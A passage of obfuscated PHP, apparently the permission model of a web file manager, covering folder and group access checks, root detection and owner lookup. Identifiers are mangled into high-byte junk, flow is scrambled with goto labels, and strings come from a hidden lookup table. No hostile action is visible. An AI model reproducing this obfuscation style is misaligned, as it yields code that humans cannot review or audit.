$AÓäÖ ¢ø[381] => $d„¡Ô‡ƒ­Ü[$AÓäÖ ¢ø[403]][$AÓäÖ ¢ø[381]], $AÓäÖ ¢ø[75] => KodIO::make($d„¡Ô‡ƒ­Ü[$AÓäÖ ¢ø[403]][$AÓäÖ ¢ø[381]]), $AÓäÖ ¢ø[474] => $AÓäÖ ¢ø[481], $AÓäÖ ¢ø[383] => $AÓäÖ ¢ø[974], $AÓäÖ ¢ø[29] => $AÓäÖ ¢ø[501], $AÓäÖ ¢ø[479] => $d„¡Ô‡ƒ­Ü[$AÓäÖ ¢ø[476]], $AÓäÖ ¢ø[2112] => $d„¡Ô‡ƒ­Ü[$AÓäÖ ¢ø[2112]], $AÓäÖ ¢ø[473] => $d„¡Ô‡ƒ­Ü[$AÓäÖ ¢ø[474]], $AÓäÖ ¢ø[2278] => array($c§ğ—ÂÕ˜·)); $eŒî²–ä•†[$b±ƒš¨¦³•[$AÓäÖ ¢ø[381]]] = $b±ƒš¨¦³•; } } $cî¡‘‹„Ä§ = array(); $D Òéğ”Ó = $this->getAllChildren($Eâ¾ùù°”); goto e¸îÆö‚Ï; BÄ‡§£ÍÛˆ: $B¬†”²àß = Model($AÓäÖ ¢ø[1124])->sourceInfo($Eâ¾ùù°”); $eŒî²–ä•† = array(); $D¿¸‡ò„ = 1; goto e„ãÔÕ³½ ; e¸îÆö‚Ï: foreach ($D Òéğ”Ó as $eŒ¿ÏÊÜ¨‰) { $Aè¥Ë¯øÏ¸ = !1; foreach ($eŒ¿ÏÊÜ¨‰[$AÓäÖ ¢ø[2278]] as $aÛÅŞèÌÜº) { if ($aÛÅŞèÌÜº[$AÓäÖ ¢ø[1443]]) { if ($aÛÅŞèÌÜº[$AÓäÖ ¢ø[1443]] == $b×Š²¤¸‹) { $Aè¥Ë¯øÏ¸ = !0; break; } } if ($aÛÅŞèÌÜº[$AÓäÖ ¢ø[2112]]) { if ($this->groupContainUser($aÛÅŞèÌÜº[$AÓäÖ ¢ø[2112]], $b×Š²¤¸‹)) { $Aè¥Ë¯øÏ¸ = !0; break; } } } if ($Aè¥Ë¯øÏ¸) { $cî¡‘‹„Ä§[] = $eŒ¿ÏÊÜ¨‰; } $DÊÔ³÷âçÄ = $eŒ¿ÏÊÜ¨‰[$AÓäÖ ¢ø[381]]; if (isset($eŒî²–ä•†[$DÊÔ³÷âçÄ])) { $eŒ¿ÏÊÜ¨‰[$AÓäÖ ¢ø[2278]][] = $eŒî²–ä•†[$DÊÔ³÷âçÄ][0]; $eŒî²–ä•†[$DÊÔ³÷âçÄ] = !1; } } $eŒî²–ä•† = array_filter(array_values($eŒî²–ä•†)); $cî¡‘‹„Ä§ = array_merge($eŒî²–ä•†, $cî¡‘‹„Ä§); goto c¥÷ô—óœõ; c¥÷ô—óœõ: return $cî¡‘‹„Ä§; goto Cš†ÇÚÓ·Ù; Cš†ÇÚÓ·Ù: } public function setAllChildrenByUser($dõ¿‘Ã­‘³, $bæ¡¿£öªÔ, $bŒ¯ùçÖÖå) { $B›«àëÊÊ =& $_SERVER[‡’¶øåüç˜]; $C§ƒŠíÂ²Ü = $this->getAllChildrenByUser($dõ¿‘Ã­‘³, $bæ¡¿£öªÔ); if (!$bŒ¯ùçÖÖå || !$C§ƒŠíÂ²Ü) { return !1; } foreach ($C§ƒŠíÂ²Ü as $AÓÉì”ñ†ä) { $B‰¶˜äå = array(); foreach ($AÓÉì”ñ†ä[$B›«àëÊÊ[2278]] as $EŸŒ»Œí) { $DµšÓ¢°ğ£ = $EŸŒ»Œí[$B›«àëÊÊ[430]]; $c³—ÏŠÉÂ² = $EŸŒ»Œí[$B›«àëÊÊ[1443]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $aôÏÌçíğİ = $EŸŒ»Œí[$B›«àëÊÊ[1443]] ? $EŸŒ»Œí[$B›«àëÊÊ[1443]] : $EŸŒ»Œí[$B›«àëÊÊ[2112]]; if ($EŸŒ»Œí[$B›«àëÊÊ[1443]] && $EŸŒ»Œí[$B›«àëÊÊ[1443]] == $bæ¡¿£öªÔ) { continue; } $B‰¶˜äå[] = array($B›«àëÊÊ[381] => $AÓÉì”ñ†ä[$B›«àëÊÊ[381]], $B›«àëÊÊ[383] => $c³—ÏŠÉÂ², $B›«àëÊÊ[469] => intval($aôÏÌçíğİ), $B›«àëÊÊ[2256] => isset($DµšÓ¢°ğ£[$B›«àëÊÊ[371]]) ? intval($DµšÓ¢°ğ£[$B›«àëÊÊ[371]]) : 0, $B›«àëÊÊ[2257] => isset($DµšÓ¢°ğ£[$B›«àëÊÊ[2257]]) ? intval($DµšÓ¢°ğ£[$B›«àëÊÊ[2257]]) : -1); } $B‰¶˜äå[] = array($B›«àëÊÊ[381] => $AÓÉì”ñ†ä[$B›«àëÊÊ[381]], $B›«àëÊÊ[383] => SourceModel::TYPE_USER, $B›«àëÊÊ[469] => intval($bæ¡¿£öªÔ), $B›«àëÊÊ[2256] => intval($bŒ¯ùçÖÖå), $B›«àëÊÊ[2257] => -1); $this->where(array($B›«àëÊÊ[395] => $AÓÉì”ñ†ä[$B›«àëÊÊ[381]]))->delete(); $this->addAll($B‰¶˜äå); } return !0; } public function get($d“İÎ¦šå) { $A‹˜Ä–”‘ = $this->getSourceList(array($d“İÎ¦šå), !0); return $A‹˜Ä–”‘[0]; } public function getSourceList($DÉ‰µÖåí©, $b£ÃÂŸø‹ä = false, $Eµ¾ŸôÓ—” = false) { goto e£óÜ„ºàù; e£óÜ„ºàù: $E„ß±‚£… =& $_SERVER[‡’¶øåüç˜]; if (!$DÉ‰µÖåí©) { return array(); } $c·æ¹„İÌ = Model($E„ß±‚£…[1124]); goto dÖ“ƒêÍ£²; CİË£¡Š: $a‹ğ·»„“› = array(); foreach ($b£ÃÂŸø‹ä as $cÑ”Õè¦»Ñ => $eÏĞ‹éïÊ) { if ($eöñ«â„–Š) { $a‹ğ·»„“›[$cÑ”Õè¦»Ñ] = $eå”–²×; continue; } $a‹ğ·»„“›[$cÑ”Õè¦»Ñ] = $this->makeSourceAuth($eÏĞ‹éïÊ, $Cáİ“Î½, $Eµ¾ŸôÓ—”); } return $a‹ğ·»„“›; goto FÉÇèğ«¡ë; aÁ“©¼É—: foreach ($b£ÃÂŸø‹ä as $Aá˜é©†ˆë => $AÜõÂšÉø) { $CŸ°Æáº‚— = $c·æ¹„İÌ->parentLevelArray($AÜõÂšÉø[$E„ß±‚£…[472]]); $bİò°Â„‰œ = array_merge($bİò°Â„‰œ, array($Aá˜é©†ˆë), array_reverse($CŸ°Æáº‚—)); } $bİò°Â„‰œ = array_values(array_unique($bİò°Â„‰œ)); if (!$bİò°Â„‰œ) { return array(); } goto b£ñ•Òä“ó; b™Å÷ƒ’º: $eöñ«â„–Š = $this->userIsRoot($Eµ¾ŸôÓ—”); $F¹ÃÉ–Èºµ = AuthModel::authAll(); $eå”–²× = array($E„ß±‚£…[389] => $F¹ÃÉ–Èºµ, $E„ß±‚£…[2284] => array($E„ß±‚£…[397] => 0, $E„ß±‚£…[2118] => $F¹ÃÉ–Èºµ, $E„ß±‚£…[398] => LNG($E„ß±‚£…[2285]), $E„ß±‚£…[2132] => $E„ß±‚£…[2286])); goto CİË£¡Š; dÖ“ƒêÍ£²: if (!$b£ÃÂŸø‹ä && count($DÉ‰µÖåí©) == 1) { $b£ÃÂŸø‹ä = array(); $b£ÃÂŸø‹ä[$DÉ‰µÖåí©[0]] = $c·æ¹„İÌ->sourceInfo($DÉ‰µÖåí©[0]); } if (!$b£ÃÂŸø‹ä) { $dÆ”©˜Ö¿ç = array($E„ß±‚£…[395] => array($E„ß±‚£…[396], $DÉ‰µÖåí©)); $b£ÃÂŸø‹ä = $c·æ¹„İÌ->field($E„ß±‚£…[2282])->where($dÆ”©˜Ö¿ç)->select(); $b£ÃÂŸø‹ä = array_to_keyvalue($b£ÃÂŸø‹ä, $E„ß±‚£…[381]); } $bİò°Â„‰œ = $DÉ‰µÖåí©; goto aÁ“©¼É—; aÊ²³¡Ê…: $Eˆ©À¡ó = array_to_keyvalue_group($Eˆ©À¡ó, $E„ß±‚£…[381]); $Cáİ“Î½ = array(); foreach ($bİò°Â„‰œ as $cÑ”Õè¦»Ñ) { if (isset($Eˆ©À¡ó[$cÑ”Õè¦»Ñ])) { $Cáİ“Î½[$cÑ”Õè¦»Ñ] = $Eˆ©À¡ó[$cÑ”Õè¦»Ñ]; } } goto b™Å÷ƒ’º; b£ñ•Òä“ó: $dÓËŒ•É¢ = $E„ß±‚£…[2283]; $dÆ”©˜Ö¿ç = array($E„ß±‚£…[395] => array($E„ß±‚£…[396], $bİò°Â„‰œ)); $Eˆ©À¡ó = $this->field($dÓËŒ•É¢)->where($dÆ”©˜Ö¿ç)->select(); goto aÊ²³¡Ê…; FÉÇèğ«¡ë: } public function authDeepCheck($AÑ½”Õó™, $C¤®›“êƒ = false) { goto dÇØÓ‘Œ°†; dÇØÓ‘Œ°†: $Cø––½¥ =& $_SERVER[‡’¶øåüç˜]; $C¤®›“êƒ = $C¤®›“êƒ ? $C¤®›“êƒ : USER_ID; $Bá„ä°¹§ = $this->makeAuthDeep($C¤®›“êƒ); goto bÀù‘ÒÚØ; bÀù‘ÒÚØ: if (!in_array($AÑ½”Õó™, $Bá„ä°¹§[$Cø––½¥[2287]])) { return !1; } $e­–´Á‡± = array(); foreach ($Bá„ä°¹§[$Cø––½¥[2288]] as $D‰‡ÖøôÙÜ => $eè‡™Î¦í») { if (!in_array($AÑ½”Õó™, $eè‡™Î¦í»)) { continue; } $e­–´Á‡±[] = $D‰‡ÖøôÙÜ; } goto aù­¤ŸÜ¸®; aù­¤ŸÜ¸®: $C‘áæÑ¨š = $e­–´Á‡± ? $e­–´Á‡±[0] : $AÑ½”Õó™; return array($Cø––½¥[389] => -1, $Cø––½¥[430] => array($Cø––½¥[397] => $Cø––½¥[1039], $Cø––½¥[2118] => $Cø––½¥[481], $Cø––½¥[398] => LNG($Cø––½¥[2289]), $Cø––½¥[2132] => $Cø––½¥[2290]), $Cø––½¥[2291] => LNG($Cø––½¥[2292]), $Cø––½¥[2293] => $this->sourceAuthInfo($C‘áæÑ¨š)); goto fäà²Ğ¶Ñ; fäà²Ğ¶Ñ: } protected function makeAuthDeep($cÏ„ô’ÂÓã = false) { goto cµ»‹ Óæ; a›·¡ˆÎù: $B‡²ê¤ãæ = array_to_keyvalue($f¯Èõ¨áˆÀ, $F³÷ŠƒÒ–[33], $F³÷ŠƒÒ–[381]); $eÓŸ…Øñã = array(); $c¼Ïå¼ØŠ© = $bğêÚ¥ğˆì; goto Aé¯ÚÓ¯è²; bÀâ¸ÒÁ‰ª: foreach ($a…ÊŞïĞÄ as $BáõËÂ¾Ãˆ => $Dâ´õ£ìÊ) { $DÅâÈ—à‹ = $FÔâ÷Êâ°[$BáõËÂ¾Ãˆ]; if (!$DÅâÈ—à‹ || !$AÁ¯Ğï¿ã[$DÅâÈ—à‹]) { continue; } $C‡Œ«İÜÃ = array(); foreach ($cò—¨«ª…•[$DÅâÈ—à‹] as $Dğ‚ä‚¦¤Ë) { $C‡Œ«İÜÃ[] = $AÁ¯Ğï¿ã[$Dğ‚ä‚¦¤Ë]; } $a…ÊŞïĞÄ[$BáõËÂ¾Ãˆ] = array_merge($C‡Œ«İÜÃ, $Dâ´õ£ìÊ); } $eÓŸ…Øñã = array_values(array_unique($eÓŸ…Øñã)); $a¿´Ô¥ÔºŠ = array($F³÷ŠƒÒ–[2287] => $eÓŸ…Øñã, $F³÷ŠƒÒ–[2288] => $a…ÊŞïĞÄ); goto eŠŒê›¬Ó; cµ»‹ Óæ: $F³÷ŠƒÒ– =& $_SERVER[‡’¶øåüç˜]; static $AÃêâ‹¼ = array(); $cÏ„ô’ÂÓã = $cÏ„ô’ÂÓã ? $cÏ„ô’ÂÓã : USER_ID; goto aãÙŒÊÄ¡Å; e‰˜Åµš…ù: if ($B‡²ê¤ãæ) { $B¥ÜßÕòš­ = $DØ¢§ó¿¾Å->where(array($F³÷ŠƒÒ–[381] => array($F³÷ŠƒÒ–[396], $B‡²ê¤ãæ)))->select(); foreach ($B¥ÜßÕòš­ as $eœÖºàæã“) { $aµ¢ÍÕÛ»… = $DØ¢§ó¿¾Å->parentLevelArray($eœÖºàæã“[$F³÷ŠƒÒ–[472]]); $eÓŸ…Øñã = array_merge($eÓŸ…Øñã, $aµ¢ÍÕÛ»…); $c¼Ïå¼ØŠ©[] = $eœÖºàæã“[$F³÷ŠƒÒ–[469]]; $a…ÊŞïĞÄ[$eœÖºàæã“[$F³÷ŠƒÒ–[381]]] = $aµ¢ÍÕÛ»…; $FÔâ÷Êâ°[$eœÖºàæã“[$F³÷ŠƒÒ–[381]]] = $eœÖºàæã“[$F³÷ŠƒÒ–[469]]; } } $c¼Ïå¼ØŠ© = array_values(array_unique($c¼Ïå¼ØŠ©)); $Eà‘Œ¡Ì·… = $c¼Ïå¼ØŠ©; goto eº½§¿İÀ´; Aé¯ÚÓ¯è²: $DØ¢§ó¿¾Å = Model($F³÷ŠƒÒ–[1124]); $D›‚Ô¢°­ï = Model($F³÷ŠƒÒ–[471]); $a…ÊŞïĞÄ = array(); goto Aå¦å°±Æ®; eŠŒê›¬Ó: $AÃêâ‹¼[$cÏ„ô’ÂÓã] = $a¿´Ô¥ÔºŠ; return $a¿´Ô¥ÔºŠ; goto C‘•ÖÌ¨Õ; e³¦Ï‘Ïµ: foreach ($Eõ™É»¦†¡ as $B³ˆ—“˜Ôİ) { if ($B³ˆ—“˜Ôİ[$F³÷ŠƒÒ–[388]] == 0 && $B³ˆ—“˜Ôİ[$F³÷ŠƒÒ–[2133]] == $F³÷ŠƒÒ–[83]) { $cÂ®‰ÒâØ—[] = $B³ˆ—“˜Ôİ[$F³÷ŠƒÒ–[371]]; } } $bğêÚ¥ğˆì = $this->userGroupParents($cÏ„ô’ÂÓã); $a¬ÊÖ÷¼ ¡ = array($F³÷ŠƒÒ–[383] => SourceModel::TYPE_USER, $F³÷ŠƒÒ–[469] => $cÏ„ô’ÂÓã); goto c§Ä’˜Î†; aãÙŒÊÄ¡Å: if (isset($AÃêâ‹¼[$cÏ„ô’ÂÓã])) { return $AÃêâ‹¼[$cÏ„ô’ÂÓã]; } $Eõ™É»¦†¡ = Model($F³÷ŠƒÒ–[2294])->listData(); $cÂ®‰ÒâØ— = array(); goto e³¦Ï‘Ïµ; eº½§¿İÀ´: foreach ($Eà‘Œ¡Ì·… as $Dğ‚ä‚¦¤Ë) { $F­ÁØÎÃÅã = $D›‚Ô¢°­ï->getInfo($Dğ‚ä‚¦¤Ë); $aµ¢ÍÕÛ»… = $DØ¢§ó¿¾Å->parentLevelArray($F­ÁØÎÃÅã[$F³÷ŠƒÒ–[472]]); $c¼Ïå¼ØŠ© = array_merge($c¼Ïå¼ØŠ©, $aµ¢ÍÕÛ»…); } $c¼Ïå¼ØŠ© = array_values(array_unique($c¼Ïå¼ØŠ©)); foreach ($c¼Ïå¼ØŠ© as $Dğ‚ä‚¦¤Ë) { $F­ÁØÎÃÅã = $D›‚Ô¢°­ï->getInfo($Dğ‚ä‚¦¤Ë); $eÓŸ…Øñã[] = $F­ÁØÎÃÅã[$F³÷ŠƒÒ–[403]][$F³÷ŠƒÒ–[381]]; $AÁ¯Ğï¿ã[$Dğ‚ä‚¦¤Ë] = $F­ÁØÎÃÅã[$F³÷ŠƒÒ–[403]][$F³÷ŠƒÒ–[381]]; $cò—¨«ª…•[$Dğ‚ä‚¦¤Ë] = $DØ¢§ó¿¾Å->parentLevelArray($F­ÁØÎÃÅã[$F³÷ŠƒÒ–[472]]); } goto bÀâ¸ÒÁ‰ª; Aå¦å°±Æ®: $FÔâ÷Êâ° = array(); $AÁ¯Ğï¿ã = array(); $cò—¨«ª…• = array(); goto e‰˜Åµš…ù; c§Ä’˜Î†: if ($bğêÚ¥ğˆì) { $a¬ÊÖ÷¼ ¡ = array(array($F³÷ŠƒÒ–[383] => SourceModel::TYPE_USER, $F³÷ŠƒÒ–[469] => $cÏ„ô’ÂÓã), array($F³÷ŠƒÒ–[383] => SourceModel::TYPE_GROUP, $F³÷ŠƒÒ–[469] => array($F³÷ŠƒÒ–[396], $bğêÚ¥ğˆì)), $F³÷ŠƒÒ–[917] => $F³÷ŠƒÒ–[2197]); } if ($cÂ®‰ÒâØ—) { $a¬ÊÖ÷¼ ¡ = array($a¬ÊÖ÷¼ ¡, $F³÷ŠƒÒ–[2256] => array($F³÷ŠƒÒ–[2295], $cÂ®‰ÒâØ—)); } $f¯Èõ¨áˆÀ = $this->field($F³÷ŠƒÒ–[2296])->where($a¬ÊÖ÷¼ ¡)->select(); goto a›·¡ˆÎù; C‘•ÖÌ¨Õ: } private function makeSourceAuth($C¬ßÖÎ¿àí, $F©ŠÀ§›“, $aï„›½»Û = false) { goto b¸±„¿ ; cÚÙâõ µ„: foreach ($A‘×º†ˆÌª as $BÍ‚¼ ŒŸ) { if (!isset($F©ŠÀ§›“[$BÍ‚¼ ŒŸ])) { continue; } $c‚³ãĞ‘ß = $this->authMake($F©ŠÀ§›“[$BÍ‚¼ ŒŸ], $aï„›½»Û); if ($c‚³ãĞ‘ß[$DÛƒØˆæ‘Ë[430]]) { $aïÃ‹‰¤Ä = $c‚³ãĞ‘ß; break; } } if (!$c¤’Óß¾¶­) { return $aïÃ‹‰¤Ä; } if (!$aïÃ‹‰¤Ä && $fä†­ÕÕŸ) { $aïÃ‹‰¤Ä = $this->groupAuthInfo($fä†­ÕÕŸ, $c¿§·‚’Ğæ); } goto eö°ŞËµà; F·­‹«¼À: $A‘×º†ˆÌª = Model($DÛƒØˆæ‘Ë[1124])->parentLevelArray($C¬ßÖÎ¿àí[$DÛƒØˆæ‘Ë[472]]); $A‘×º†ˆÌª = array_merge(array($C¬ßÖÎ¿àí[$DÛƒØˆæ‘Ë[381]]), array_reverse($A‘×º†ˆÌª)); $aïÃ‹‰¤Ä = !1; goto cÚÙâõ µ„; BãÙ¿ë÷ÊÙ: $c¤’Óß¾¶­ = $C¬ßÖÎ¿àí[$DÛƒØˆæ‘Ë[383]] == SourceModel::TYPE_GROUP; $fä†­ÕÕŸ = $c¤’Óß¾¶­ ? $this->groupRootAuth($c¿§·‚’Ğæ, $aï„›½»Û) : !1; if ($fä†­ÕÕŸ && Model($DÛƒØˆæ‘Ë[2275])->authCheckAction($fä†­ÕÕŸ[$DÛƒØˆæ‘Ë[388]], $DÛƒØˆæ‘Ë[1567])) { return $this->groupAuthInfo($fä†­ÕÕŸ, $c¿§·‚’Ğæ); } goto F·­‹«¼À; eö°ŞËµà: if (!$aïÃ‹‰¤Ä) { $E÷ôÑŞ½ØŒ = Model($DÛƒØˆæ‘Ë[471])->getInfo($c¿§·‚’Ğæ); $fâƒ”å×Ë» = explode($DÛƒØˆæ‘Ë[47], trim($E÷ôÑŞ½ØŒ[$DÛƒØˆæ‘Ë[472]], $DÛƒØˆæ‘Ë[47])); foreach ($fâƒ”å×Ë» as $A¨¹Ä÷Ó) { if ($A¨¹Ä÷Ó == $DÛƒØˆæ‘Ë[481] || $A¨¹Ä÷Ó == $dˆ ËìÓç½) { continue; } $D÷¥ÖÚç§š = $this->groupRootAuth($A¨¹Ä÷Ó, $aï„›½»Û); if (!$D÷¥ÖÚç§š) { continue; } $aïÃ‹‰¤Ä = $this->groupAuthInfo($D÷¥ÖÚç§š, $A¨¹Ä÷Ó); break; } } if (!$aïÃ‹‰¤Ä || $aïÃ‹‰¤Ä[$DÛƒØˆæ‘Ë[389]] <= 0) { $D·²œ—ª– = $this->authDeepCheck($C¬ßÖÎ¿àí[$DÛƒØˆæ‘Ë[381]], $aï„›½»Û); if ($D·²œ—ª–) { $aïÃ‹‰¤Ä = $D·²œ—ª–; } } return $aïÃ‹‰¤Ä; goto B‹šï³¾Ó; b¸±„¿ : $DÛƒØˆæ‘Ë =& $_SERVER[‡’¶øåüç˜]; $dˆ ËìÓç½ = $DÛƒØˆæ‘Ë[83]; $c¿§·‚’Ğæ = $C¬ßÖÎ¿àí[$DÛƒØˆæ‘Ë[469]]; goto BãÙ¿ë÷ÊÙ; B‹šï³¾Ó: } private function userIsRoot($e”äîÜ„¢ = false) { $DôÀŠ”¸ºà =& $_SERVER[‡’¶øåüç˜]; if (!$e”äîÜ„¢ && _get($GLOBALS, $DôÀŠ”¸ºà[470])) { return !0; } $C¨òÂ÷Ç‘Ò = Model($DôÀŠ”¸ºà[490])->getInfo($e”äîÜ„¢); $eáç¨·¤˜ = Model($DôÀŠ”¸ºà[2297])->listData($C¨òÂ÷Ç‘Ò[$DôÀŠ”¸ºà[1327]]); if ($eáç¨·¤˜ && $eáç¨·¤˜[$DôÀŠ”¸ºà[1199]][$DôÀŠ”¸ºà[2298]] == 1) { return !0; } return !1; } private function sourceAuthInfo($aê¨—¶¶éæ) { goto fÈ´‡öù¹à; BŒÂ†¹à«: if (isset($f±Ì¶ºö”[$e¤ÚÔ¶½ª‡[477]])) { $d†øŒÆÚ‘ = explode($e¤ÚÔ¶½ª‡[8], trim($f±Ì¶ºö”[$e¤ÚÔ¶½ª‡[479]], $e¤ÚÔ¶½ª‡[8])); array_shift($d†øŒÆÚ‘); $cØ»Ç•·… = $f±Ì¶ºö”[$e¤ÚÔ¶½ª‡[475]] . $e¤ÚÔ¶½ª‡[2299] . implode($e¤ÚÔ¶½ª‡[8], $d†øŒÆÚ‘); } return array($e¤ÚÔ¶½ª‡[398] => $f±Ì¶ºö”[$e¤ÚÔ¶½ª‡[28]], $e¤ÚÔ¶½ª‡[75] => KodIO::make($f±Ì¶ºö”[$e¤ÚÔ¶½ª‡[381]]), $e¤ÚÔ¶½ª‡[2300] => $cØ»Ç•·…); goto C÷£–ëíÍõ; c´÷ôøÃ·: if (!$f±Ì¶ºö”) { return !1; } $cˆñÂ°–í->groupPathDisplay($f±Ì¶ºö”); $e»ë°™àø‘ = array($f±Ì¶ºö”); goto a½¹šÖƒà´; fÈ´‡öù¹à: $e¤ÚÔ¶½ª‡ =& $_SERVER[‡’¶øåüç˜]; $cˆñÂ°–í = Model($e¤ÚÔ¶½ª‡[1124]); $f±Ì¶ºö” = $cˆñÂ°–í->sourceInfo($aê¨—¶¶éæ); goto c´÷ôøÃ·; a½¹šÖƒà´: $e»ë°™àø‘ = $cˆñÂ°–í->_listAppendPath($e»ë°™àø‘); $f±Ì¶ºö” = $e»ë°™àø‘[0]; $cØ»Ç•·… = $f±Ì¶ºö”[$e¤ÚÔ¶½ª‡[479]]; goto BŒÂ†¹à«; C÷£–ëíÍõ: } private function groupAuthInfo($A‹­íõĞñß, $f†ÂÛ‡ßæ‚) { $C®í¿šñà =& $_SERVER[‡’¶øåüç˜]; $d”ÓöŠíİÍ = Model($C®í¿šñà[471])->getInfo($f†ÂÛ‡ßæ‚); return array($C®í¿šñà[2301] => intval($A‹­íõĞñß[$C®í¿šñà[388]]), $C®í¿šñà[2284] => $A‹­íõĞñß, $C®í¿šñà[2302] => LNG($C®í¿šñà[2303]), $C®í¿šñà[2293] => array($C®í¿šñà[398] => $d”ÓöŠíİÍ[$C®í¿šñà[28]], $C®í¿šñà[75] => KodIO::make($d”ÓöŠíİÍ[$C®í¿šñà[403]][$C®í¿šñà[381]]), $C®í¿šñà[2300] => $d”ÓöŠíİÍ[$C®í¿šñà[476]])); } protected function groupRootAuth($Dæ£ë„ğÅÄ, $b¹ƒÔâ£¹” = false) { goto aåƒŒß×õ; Cç»ôèíš¯: $bÜªªÈŠÖ = $BÇÔË¸¬Äé ? $this->authMake($BÇÔË¸¬Äé, $b¹ƒÔâ£¹”) : !1; $b¾™½Ğë˜¯ = $bÜªªÈŠÖ ? $bÜªªÈŠÖ[$Eäí˜ï¼°Æ[430]] : !1; $Aö›Çğ°–Œ[$Aô¢â­·¨Æ] = $b¾™½Ğë˜¯ ? $b¾™½Ğë˜¯ : $EºÊ†ó„Ç; goto Cğ—‡¿âæ; Cğ—‡¿âæ: return $Aö›Çğ°–Œ[$Aô¢â­·¨Æ]; goto E…¾éÛ; bŠğŠ®Şåë: $B‚Ëìêé‰‰ = array($Eäí˜ï¼°Æ[381] => $CÒ»èøØ‡[$Eäí˜ï¼°Æ[403]][$Eäí˜ï¼°Æ[381]]); $a±îÎ™´ªÅ = $Eäí˜ï¼°Æ[2283]; $BÇÔË¸¬Äé = $this->field($a±îÎ™´ªÅ)->cacheMemory()->where($B‚Ëìêé‰‰)->select(); goto Cç»ôèíš¯; dÛÒŸŒí‰ó: $bÏâÂŒù½ = $this->userGroupList($b¹ƒÔâ£¹”); $EºÊ†ó„Ç = isset($bÏâÂŒù½[$Dæ£ë„ğÅÄ]) ? $bÏâÂŒù½[$Dæ£ë„ğÅÄ][$Eäí˜ï¼°Æ[388]] : !1; if ($EºÊ†ó„Ç && Model($Eäí˜ï¼°Æ[2275])->authCheckAction($EºÊ†ó„Ç[$Eäí˜ï¼°Æ[388]], $Eäí˜ï¼°Æ[1567])) { $Aö›Çğ°–Œ[$Aô¢â­·¨Æ] = $EºÊ†ó„Ç; return $EºÊ†ó„Ç; } goto bŠğŠ®Şåë; aåƒŒß×õ: $Eäí˜ï¼°Æ =& $_SERVER[‡’¶øåüç˜]; $b¹ƒÔâ£¹” = $b¹ƒÔâ£¹” ? $b¹ƒÔâ£¹” : USER_ID; $Aô¢â­·¨Æ = $b¹ƒÔâ£¹” . $Eäí˜ï¼°Æ[2304] . $Dæ£ë„ğÅÄ; goto eø‹šÂĞÕ•; eø‹šÂĞÕ•: static $Aö›Çğ°–Œ = array(); if (isset($Aö›Çğ°–Œ[$Aô¢â­·¨Æ])) { return $Aö›Çğ°–Œ[$Aô¢â­·¨Æ]; } $CÒ»èøØ‡ = Model($Eäí˜ï¼°Æ[471])->getInfo($Dæ£ë„ğÅÄ); goto dÛÒŸŒí‰ó; E…¾éÛ: } public function authOwnerApply($c±»ò®¤™ê) { goto cá×÷¹£ŠÖ; CÖºìš†•: $c±»ò®¤™ê[$e¼ŠĞ¥Ï–œ[388]][$e¼ŠĞ¥Ï–œ[2307]] = Model($e¼ŠĞ¥Ï–œ[487])->userListInfo($cÇ„Œ®ì»); return $c±»ò®¤™ê; goto e¼‹ŒŞÁĞË; cğ‘Ì®šìŸ: $CôÙÄèîñç = Model($e¼ŠĞ¥Ï–œ[1124])->parentLevelArray($c±»ò®¤™ê[$e¼ŠĞ¥Ï–œ[472]]); $CôÙÄèîñç = array_merge(array($c±»ò®¤™ê[$e¼ŠĞ¥Ï–œ[381]]), array_reverse($CôÙÄèîñç)); $Cˆë™Å…Äœ = $e¼ŠĞ¥Ï–œ[2283]; goto cêæÍá½¬¡; cá×÷¹£ŠÖ: $e¼ŠĞ¥Ï–œ =& $_SERVER[‡’¶øåüç˜]; if (empty($c±»ò®¤™ê[$e¼ŠĞ¥Ï–œ[388]]) || isset($c±»ò®¤™ê[$e¼ŠĞ¥Ï–œ[2305]]) && $c±»ò®¤™ê[$e¼ŠĞ¥Ï–œ[2305]]) { return $c±»ò®¤™ê; } if (AuthModel::authCheckRoot($c±»ò®¤™ê[$e¼ŠĞ¥Ï–œ[388]][$e¼ŠĞ¥Ï–œ[389]])) { return $c±»ò®¤™ê; } goto cğ‘Ì®šìŸ; cêæÍá½¬¡: $aç ÄáîÔ• = array($e¼ŠĞ¥Ï–œ[395] => array($e¼ŠĞ¥Ï–œ[396], $CôÙÄèîñç)); $FÆ„çñ‰Î = $this->field($Cˆë™Å…Äœ)->where($aç ÄáîÔ•)->select(); $FÆ„çñ‰Î = array_to_keyvalue_group($FÆ„çñ‰Î, $e¼ŠĞ¥Ï–œ[381]); goto Bç“òä×ƒ; Bç“òä×ƒ: $A«òî§„·ó = array(); $cÇ„Œ®ì» = array(); foreach ($FÆ„çñ‰Î as $C²Ñ»Ø‘Ê => $E‹ù‚ù—ø) { $c³–ŠÕŠˆ¬ = $this->authFolderOwnerUser($E‹ù‚ù—ø); $A«òî§„·ó[$C²Ñ»Ø‘Ê] = $c³–ŠÕŠˆ¬; $cÇ„Œ®ì» = array_merge($cÇ„Œ®ì», $c³–ŠÕŠˆ¬[$e¼ŠĞ¥Ï–œ[547]]); if ($c³–ŠÕŠˆ¬[$e¼ŠĞ¥Ï–œ[2306]]) { break; } } goto Fáòö¹ñ¯µ; Fáòö¹ñ¯µ: if (count($cÇ„Œ®ì») == 0) { $cÇ„Œ®ì» = $this->authFolderOwnerGroup($c±»ò®¤™ê[$e¼ŠĞ¥Ï–œ[469]]); } $cÇ„Œ®ì» = array_unique($cÇ„Œ®ì»); if (AuthModel::authCheckRoot($c±»ò®¤™ê[$e¼ŠĞ¥Ï–œ[388]][$e¼ŠĞ¥Ï–œ[389]])) { $cÇ„Œ®ì»[] = USER_ID; } goto CÖºìš†•; e¼‹ŒŞÁĞË: } private function authFolderOwnerGroup($C‹Çö¹À) { $FàĞ†Æ¼Õ =& $_SERVER[‡’¶øåüç˜]; $föÎİà¦ƒÛ = Model($FàĞ†Æ¼Õ[2191])->where(array($FàĞ†Æ¼Õ[2112] => $C‹Çö¹À))->select(); $f¯Ñ§È ¦ = array(); if (!$föÎİà¦ƒÛ) { return $f¯Ñ§È ¦; } foreach ($föÎİà¦ƒÛ as $FËƒ†¾) { $cëÈñÕÕ”ê = $this->authInfo($FËƒ†¾); if (AuthModel::authCheckRoot($cëÈñÕÕ”ê[$FàĞ†Æ¼Õ[388]])) { $f¯Ñ§È ¦[] = $FËƒ†¾[$FàĞ†Æ¼Õ[1443]]; } } return $f¯Ñ§È ¦; } private function authFolderOwnerUser($cÜ‘²óËÎ†) { $FË¢Óì¢ =& $_SERVER[‡’¶øåüç˜]; $fÕ°åÆÓÇ = array(); $D§ò…ºÀÑ = !1; foreach ($cÜ‘²óËÎ† as 